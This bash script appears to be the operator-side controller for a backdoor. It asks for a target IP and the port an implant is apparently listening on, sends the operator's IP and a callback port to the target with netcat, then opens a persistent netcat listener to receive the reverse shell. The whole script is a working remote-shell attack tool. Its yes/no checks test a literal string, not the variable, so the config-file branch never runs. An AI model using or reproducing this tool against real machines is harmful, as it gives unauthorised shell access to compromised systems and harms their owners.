#!/bin/bash

#Automates the process of connecting to the target

EXTIP=`dig +short myip.opendns.com @resolver1.opendns.com`
NETIP=`ifconfig | 
sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'`

Questions() {
  echo What was PPORT set to?
  read PPORT
  echo What is the target IP?
  read TARGETIP
  echo What port to receive shell from?
  read LPORT
  echo What is the master IP? 
  echo Guesses: External IP is ${EXTIP} - Local network IP is ${NETIP}
  read MASTERIP
}

ListenReceive() {
  nc -lvk ${LPORT}
}

SendInfo() {
  INFO="$MASTERIP\n$LPORT\n\n"
  printf $INFO | nc ${TARGETIP} ${PPORT}
}

Connect() {
  echo Sending info to the target...
  echo Awaiting response...
  SendInfo
  ListenReceive
}

echo Use config file variables [y/n]?
read ConfigYN
if [[ ConfigYN = "y" ]] ; then
  if [[ ! -f ./master.config ]] ; then
    echo You can make a file called "master.config" in this directory to predefine the variables
    echo The file does not exist
    Questions
    Connect
  elif [[ -f ./master.config ]]; then
    echo Using predefined variables from config file
    source ./master.config
    Connect
  else
    echo Error
    Questions
    Connect
  fi
elif [[ ConfigYN = "n" ]] ; then
    echo Answer these questions :
    Questions
    Connect
else
  echo Error
  Questions
  Connect
fi
